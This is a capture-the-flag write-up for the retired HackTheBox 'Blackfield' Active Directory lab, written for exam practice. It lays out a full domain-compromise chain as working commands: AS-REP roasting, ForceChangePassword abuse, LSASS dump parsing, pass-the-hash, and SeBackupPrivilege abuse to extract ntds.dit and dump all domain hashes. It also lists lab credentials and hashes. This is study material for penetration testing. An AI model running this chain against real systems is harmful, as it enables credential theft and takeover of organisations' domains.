# BLACKFIELD — Hard

**Date Started:** June 18, 2026
**Date Completed:** June 18, 2026
**Difficulty:** Hard
**Platform:** HackTheBox (retired)
**Tags:** Active Directory, AS-REP Roasting, ForceChangePassword, LSASS dump, SeBackupPrivilege, pypykatz
**Status:** COMPLETE

---

## Summary / Attack Chain

Username harvesting from SMB share directory names, AS-REP Roasting for initial creds, BloodHound ACL abuse to pivot via ForceChangePassword, LSASS dump from a forensic share for lateral movement, then SeBackupPrivilege abuse to grab ntds.dit via shadow copy for full domain compromise.

```
SMB null/guest → profiles$ share → 300+ usernames from directory names
  → AS-REP Roast → support (#00^BlackKnight) → hashcat -m 18200
    → BloodHound → support has ForceChangePassword on audit2020
      → rpcclient setuserinfo2 audit2020 23 "NewPass123!"
        → forensic share → lsass.zip → pypykatz → svc_backup NT hash (9658d1d1dcd9250115e2205d9f48400d)
          → PtH evil-winrm → SeBackupPrivilege
            → diskshadow script → shadow copy Z: → robocopy /B ntds.dit → reg save SYSTEM
              → secretsdump.py -system system -ntds ntds.dit LOCAL → Administrator hash (184fb5e5178480be64824d4cd53b99ee)
                → PtH → DA
```

**New techniques vs previous boxes:** Username harvesting from share directory names, ForceChangePassword ACL abuse via rpcclient, LSASS minidump parsing with pypykatz (offline, not live mimikatz), SeBackupPrivilege abuse with diskshadow + robocopy /B, secretsdump LOCAL mode for parsing extracted ntds.dit + SYSTEM files.

---

## Phase 1 — Enumeration

```bash
nmap -p- -Pn --min-rate 1000 -T4 10.129.14.168 -oN blackfield_all_ports.txt
nmap -p 53,88,135,139,389,445,593,636,3268,3269,5985 -Pn -sC -sV 10.129.14.168 -oN blackfield_services.txt
```

**Findings / reads:**
- **DC fingerprint** (53/88/389/636/3268/3269/445) — Domain Controller.
- **Domain: `BLACKFIELD.local`**, Host: `DC01`.
- **Windows Server 2019** — modern OS, fewer legacy misconfigs expected.
- **Port 5985 (WinRM)** — open, evil-winrm available with valid creds + group membership.
- SMB signing required — relay off the table.

```bash
echo "10.129.14.168 BLACKFIELD.local DC01.BLACKFIELD.local DC01" | sudo tee -a /etc/hosts
```

---

## Phase 2 — SMB Null Session + Username Harvesting

```bash
nxc smb 10.129.14.168 -u '' -p '' --shares
```

Guest/null access reveals a **profiles$** share with READ access.

```bash
smbclient //10.129.14.168/profiles$ -U '' -N
```

Inside: **300+ directories**, each named after a domain user. No files inside them, but the directory names ARE the usernames.

### Harvest usernames from directory names
```bash
smbclient //10.129.14.168/profiles$ -U '' -N -c 'ls' | awk '{print $1}' > users.txt
```

Clean the output to get one username per line. This is the user list for AS-REP Roasting.

> **Lesson:** Share directory names are a valid enumeration source. The `profiles$` pattern (per-user profile directories) is common in enterprise environments. Even if the directories are empty, the names give you a full user list without needing LDAP anonymous bind or RPC user enumeration.

---

## Phase 3 — AS-REP Roasting → support

```bash
GetNPUsers.py BLACKFIELD.local/ -dc-ip 10.129.14.168 -usersfile users.txt -no-pass
```

**Hit:** `support` account has pre-auth disabled. AS-REP hash returned.

```bash
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
```

| Flag | Meaning |
|------|---------|
| `-m 18200` | AS-REP Roast (Kerberos 5 AS-REP etype 23) |

**`support : #00^BlackKnight`** — validated via `nxc smb`.

WinRM access check:
```bash
nxc winrm 10.129.14.168 -u support -p '#00^BlackKnight'
```
No WinRM access (not in Remote Management Users). Creds are valid for SMB and LDAP only.

---

## Phase 4 — BloodHound → ForceChangePassword Edge

### Remote BloodHound collection
```bash
bloodhound-python -u support -p '#00^BlackKnight' -d BLACKFIELD.local -ns 10.129.14.168 -c all
```

Import JSON files into BloodHound. Mark `support` as owned.

### Finding the path
Click on owned `support` user → **Outbound Object Control** (not "Member Of"). This shows ACL-based edges, not group memberships.

**Finding:** `support` has **ForceChangePassword** on `audit2020`.

ForceChangePassword is a distinct ACL edge. It lets you reset another user's password without knowing the current one. It is NOT the same as GenericAll or GenericWrite, and uses different tooling.

> **Lesson:** After marking a user owned in BloodHound, check **Outbound Object Control** for ACL edges. Group memberships ("Member Of") only show group-based access. The interesting pivots in AD come from ACL edges: ForceChangePassword, GenericAll, GenericWrite, WriteDACL, WriteOwner. These show up under Outbound Object Control, not under membership tabs.

---

## Phase 5 — ForceChangePassword via rpcclient

```bash
rpcclient -U 'support%#00^BlackKnight' 10.129.14.168
```

```
rpcclient $> setuserinfo2 audit2020 23 "NewPass123!"
```

| Argument | Meaning |
|----------|---------|
| `audit2020` | Target user to modify |
| `23` | Info level 23 = set password (UserInternal4Information) |
| `"NewPass123!"` | New password (must meet domain complexity requirements) |

**`audit2020 : NewPass123!`** — validated via `nxc smb`.

### Re-enumerate shares with audit2020
```bash
nxc smb 10.129.14.168 -u audit2020 -p 'NewPass123!' --shares
```

New access: **forensic** share (READ).

---

## Phase 6 — Forensic Share → LSASS Dump → svc_backup

```bash
smbclient //10.129.14.168/forensic -U 'BLACKFIELD.local\audit2020%NewPass123!' -c 'recurse ON; prompt OFF; mget *'
```

**Key find:** `memory_analysis/lsass.zip` containing an LSASS process dump.

### Parse LSASS dump with pypykatz
```bash
unzip lsass.zip
pypykatz lsa minidump lsass.DMP
```

pypykatz is the Python implementation of mimikatz's minidump parser. It reads LSASS dumps offline without needing to run mimikatz on the target.

**Hashes extracted:**
- `Administrator` NT hash — **stale/invalid** (the dump is from a forensic artifact, not a live capture; the password was changed after the dump was taken)
- `svc_backup` NT hash: `9658d1d1dcd9250115e2205d9f48400d` — **valid**

```bash
nxc smb 10.129.14.168 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'    # (Pwn3d!)
nxc winrm 10.129.14.168 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'   # WinRM access confirmed
```

> **Lesson:** LSASS dumps from forensic/IR artifacts are a real attack vector. You don't always get hashes from live memory via mimikatz. Forensic shares, backup directories, and IR evidence folders can contain LSASS dumps with cached credentials. However, hashes in old dumps may be stale. Always validate each hash before building your attack plan on it.

---

## Phase 7 — Shell + User Flag

```bash
evil-winrm -i 10.129.14.168 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
```

| Flag | Meaning |
|------|---------|
| `-H` | Pass-the-Hash (NT hash, not password) |

```
*Evil-WinRM* PS> type C:\Users\svc_backup\Desktop\user.txt
# 3920bb317a0bef51027e2852be64b543
```

### Privilege check
```
*Evil-WinRM* PS> whoami /priv
```

**SeBackupPrivilege** — enabled. This privilege allows reading any file on the system, bypassing all ACLs. The intended use is for backup software, but it grants arbitrary file read.

The target is `ntds.dit` (the AD database containing all domain hashes). However, ntds.dit is locked by the Active Directory service and cannot be copied directly, even with SeBackupPrivilege. It must be accessed through a Volume Shadow Copy.

---

## Phase 8 — SeBackupPrivilege Abuse → ntds.dit

### Step 1: Create diskshadow script

On the attack host, create the script:
```
set context persistent nowriters
add volume C: alias cdrive
create
expose %cdrive% Z:
```

Convert to CRLF line endings (diskshadow requires Windows-style line endings):
```bash
unix2dos script.dsh
```

### Step 2: Upload and execute

```
*Evil-WinRM* PS> mkdir C:\temp
*Evil-WinRM* PS> cd C:\temp
*Evil-WinRM* PS> upload script.dsh
*Evil-WinRM* PS> diskshadow /s C:\temp\script.dsh
```

This creates a shadow copy of C: and exposes it as Z:. The shadow copy is a point-in-time snapshot, and the ntds.dit file in it is NOT locked by the AD service.

### Step 3: Copy ntds.dit using robocopy /B

```
*Evil-WinRM* PS> robocopy /B Z:\Windows\NTDS C:\temp ntds.dit
```

| Flag | Meaning |
|------|---------|
| `/B` | Backup mode — uses SeBackupPrivilege to bypass ACLs. Without this flag, access denied even with the privilege. |

### Step 4: Export SYSTEM hive

```
*Evil-WinRM* PS> reg save HKLM\SYSTEM C:\temp\system
```

The SYSTEM hive contains the boot key needed to decrypt ntds.dit.

### Step 5: Download to attack host

```
*Evil-WinRM* PS> cd C:\temp
*Evil-WinRM* PS> download ntds.dit
*Evil-WinRM* PS> download system
```

> **Lesson:** SeBackupPrivilege = read any file bypassing ACLs, but ntds.dit is locked by the AD service during normal operation. You need a shadow copy (via diskshadow) to get an unlocked copy. Then robocopy /B activates backup mode to actually use the privilege. Without the /B flag, you get access denied. The diskshadow script also needs CRLF line endings (unix2dos) or it fails to parse.

---

## Phase 9 — secretsdump LOCAL → DA

```bash
secretsdump.py -system system -ntds ntds.dit LOCAL
```

| Flag | Meaning |
|------|---------|
| `-system system` | Path to exported SYSTEM hive (contains boot key) |
| `-ntds ntds.dit` | Path to exported ntds.dit database |
| `LOCAL` | Parse local files instead of connecting to a remote DC (no DCSync needed) |

**Administrator NT hash: `184fb5e5178480be64824d4cd53b99ee`**

```bash
nxc smb 10.129.14.168 -u Administrator -H '184fb5e5178480be64824d4cd53b99ee'    # (Pwn3d!)
evil-winrm -i 10.129.14.168 -u Administrator -H '184fb5e5178480be64824d4cd53b99ee'
```

```
*Evil-WinRM* PS> type C:\Users\Administrator\Desktop\root.txt
```

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `3920bb317a0bef51027e2852be64b543` |
| root.txt | *(instance-specific)* |

*(HTB flags rotate per spawn — these are instance-specific.)*

---

## Mistakes / Tool Issues

All mistakes were tool UI/mechanics. No decision-making errors on technique selection.

1. **BloodHound UI — Outbound Object Control vs Member Of.** Didn't know to check Outbound Object Control to find ACL edges like ForceChangePassword. Needed a nudge that ACL-based edges (ForceChangePassword, GenericAll, WriteDACL) appear under Outbound Object Control after marking a user owned, not under group membership tabs. This is a BloodHound UI knowledge gap, not a technique gap.

2. **evil-winrm upload path mangling.** The `upload` command mangled Windows paths like `C:\temp\script.dsh`. Fix: `cd` to the target directory first, then upload with just the filename (`upload script.dsh`).

3. **Forgot to create C:\temp before uploading.** Got a "path not found" error. Always `mkdir C:\temp` before trying to upload files there.

4. **Inconsistent directory naming (C:\tmp vs C:\temp).** Created `C:\tmp` but referenced `C:\temp` later. Pick one name and stick with it for the entire engagement.

**Solo rating: 🟡 BH UI help** — only needed guidance on where BloodHound displays ACL edges. Every technique choice (AS-REP, ForceChangePassword, pypykatz, SeBackupPrivilege abuse chain) was correct without hints.

---

## Lessons / Exam Relevance

- **Username harvesting from share directory names** — the `profiles$` pattern gives you a full user list even when LDAP anonymous and RPC user enumeration are locked down. `smbclient ls | awk` to extract names from directory listings.
- **ForceChangePassword is distinct tooling** — it's not GenericAll or GenericWrite. Uses `rpcclient setuserinfo2 <user> 23 "<password>"`. Info level 23 is the password reset level. bloodyAD handles GenericWrite-based password changes; rpcclient handles ForceChangePassword.
- **LSASS dumps from file shares** — forensic/IR artifacts on shares can contain LSASS minidumps with cached credentials. pypykatz parses these offline. Not every LSASS dump comes from live mimikatz.
- **Stale hashes in LSASS dumps** — old dumps may contain credentials that have since been rotated. Always validate each extracted hash with nxc before building your attack plan on it. The Administrator hash in this dump was stale; the svc_backup hash was valid.
- **SeBackupPrivilege abuse chain** — the full sequence: diskshadow script (CRLF line endings via unix2dos) → shadow copy → robocopy /B for ntds.dit → reg save HKLM\SYSTEM → secretsdump LOCAL. Each step has a gotcha: diskshadow needs CRLF, robocopy needs /B, secretsdump needs both ntds.dit AND the SYSTEM hive.
- **robocopy /B** — the /B flag activates backup mode, which is what actually invokes SeBackupPrivilege. Without it, you get access denied even though the privilege is enabled. The privilege is the capability; /B is the flag that uses it.
- **secretsdump LOCAL vs remote DCSync** — `secretsdump.py -system <system> -ntds <ntds.dit> LOCAL` parses extracted files without touching the network. No need for DCSync privileges if you can physically grab the files.
- **BloodHound workflow** — after marking a user owned, check Outbound Object Control (not just Member Of) for ACL-based attack paths. The most interesting AD pivots are ACL edges, not group memberships.
- **evil-winrm upload workflow** — `cd` to the target directory first, then `upload <filename>` with no path prefix. The upload command mangles backslash paths.
- **diskshadow CRLF requirement** — scripts must have Windows-style line endings. `unix2dos` on the attack host before uploading. Subtle failure mode: diskshadow just silently fails or errors with no useful message.

## Cleanup / Changes Made

- Changed `audit2020` password via ForceChangePassword (rpcclient setuserinfo2).
- Created `C:\temp` directory on DC01, uploaded diskshadow script.
- Created Volume Shadow Copy exposed as Z: drive.
- Downloaded ntds.dit and SYSTEM hive to attack host.
